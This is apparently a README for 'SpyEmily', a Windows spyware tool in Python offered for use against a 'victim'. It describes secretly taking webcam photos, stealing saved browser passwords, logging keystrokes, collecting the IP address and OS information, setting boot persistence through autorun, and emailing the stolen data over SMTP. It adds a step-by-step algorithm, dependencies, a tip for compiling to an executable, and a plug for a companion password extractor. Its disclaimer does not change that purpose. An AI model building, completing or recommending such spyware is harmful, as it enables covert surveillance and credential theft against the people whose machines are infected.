# SpyEmily.
A cute and simple spyware, written in Python 3.6. Do not abuse!

# How it works.
Let's see! So, this simple spyware collects some private information about a victim: photo from a frontal camera, passwords from browsers, OS information, key logs, IP address. Besides, this spyware has a simple keylogger. After stealing the data, the program sends that via the SMTP protocol. Also, the program creates an autorun option and starts every boot. This will always send you victim's information. Notice that the SpyEmily works only with Windows!

Let's look at the approximate algorithm of this spyware.
1. If we start from autorun, we are OLD_VICTIM.
2. Otherwise, we are NEW_VICTIM. And also we create an autorun option for the application.
3. We get the IP adress of the victim's computer.
4. We take pictures from a frontal camera.
5. We steal passwords from browsers.
6. If the file with key logs exists, we get it.
7. We are waiting for Internet connection.
8. After establishing connection, we send email.
9. Then we delete taken pictures.
10. After that, we start (or continue after the last time) the keylogger.
11. If we get any exceptions during all this staff, we send email with the error code.

That is pretty simple!

# Requirements.
- Windows.
- Python 3.6 and some modules, written below.
  - bs4
  - pynput
  - pypiwin32
  - requests
  - opencv-python==3.4.1.15

# Recommendations.
I recommend you to use my other tool called "PasswordExtractor". This tool is going to help you to extract passwords from sqlite3 databases, which often used by popular browsers (Google Chrome, Opera, Yandex Browser, etc.) for keeping passwords. So, if you have an sqlite database with passwords, you are welcome to use my tool.
You can find it here: https://github.com/atlanntiss/PasswordExtractor

The second thing. If you are going to compile SpyEmily.py to an executable file, change the second argument of the os.path.join() function from f"{FAKE_APP}.py" to f"{FAKE_APP}.exe" on line 144 in the set_autorun() function. If you compiled the app to an executable file, but there is still the .py extension for the app path in the code, it will never work for autorun. Hopefully, you understood.

# Denial of responsibility.
I DO NOT bear responsibility for the damage caused by you! Do not break the law and act legally! Do not abuse! Hopefully, you have got this now!
